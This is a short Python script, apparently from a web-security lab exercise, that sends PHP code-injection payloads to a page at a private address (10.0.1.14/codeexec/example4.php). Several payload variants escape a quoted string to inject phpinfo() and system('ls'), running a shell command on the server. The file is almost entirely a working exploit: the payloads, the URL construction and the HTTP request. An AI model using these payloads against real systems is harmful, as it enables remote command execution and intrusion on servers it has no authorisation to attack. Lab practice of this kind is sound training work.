import urllib.parse
import urllib.request
import lxml.html as lh




payload = {"name": "hacker" }
payload = {"name": "hacker'.phpinfo().'" }
payload = {"name": "hacker'.system('ls').'" }
payload = {"name": "hacker'.system('ls').phpinfo().'" }
payload = {"name": "hacker'.phpinfo().system('ls').'" }

payload = urllib.parse.urlencode(payload)
url = "http://10.0.1.14/codeexec/example4.php?"+payload
print(url)

with urllib.request.urlopen(url) as reponse:
	content = reponse.read()
# print(content)

